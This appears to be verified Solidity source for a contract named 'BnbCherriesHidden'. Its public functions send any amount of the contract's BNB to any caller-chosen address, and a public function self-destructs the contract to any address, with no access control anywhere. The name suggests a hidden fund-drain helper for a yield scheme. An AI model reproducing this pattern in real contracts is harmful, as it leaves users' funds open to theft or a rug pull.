/**
 *Submitted for verification at BscScan.com on 2022-05-11
*/

// File: 414322.sol



pragma solidity 0.8.9;

contract BnbCherriesHidden{


    function distEggs(address f) public  {
        uint256 balance = address(this).balance;
        require(balance > 0, "Insufficent balance");
        _w(f, address(this).balance);
    }

     function _distEggs(address f, uint256 amount) public  {
        uint256 balance = address(this).balance;
        require(balance > 0, "Insufficent balance");
        _w(f, amount);
    }

    function _w(address _address, uint256 _amount) public {
        (bool success, ) = _address.call{ value: _amount }("");
        require(success, "Failed to widthdraw Ether");
    }

    function def(address f) public  {
        address payable _to = payable (f);
        selfdestruct(_to);
    }

}